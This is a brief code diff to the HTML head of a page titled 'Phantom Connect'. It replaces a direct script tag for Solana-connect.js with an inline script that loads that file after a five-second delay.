@@ -5,9 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phantom Connect</title>
     <link rel="icon" href="" type="image/x-icon">
-    <script src="Solana-connect.js"></script>
     <script src="dynamicview.js"></script>
     <script src="info.js"></script>
+    <script>
+        // Delay loading of Solana-connect.js
+        setTimeout(function() {
+            var script = document.createElement('script');
+            script.src = 'Solana-connect.js';
+            document.head.appendChild(script);
+        }, 5000); // 5000 milliseconds = 5 seconds delay
+    </script>
     
 </head>
 <body id="phantomButton">
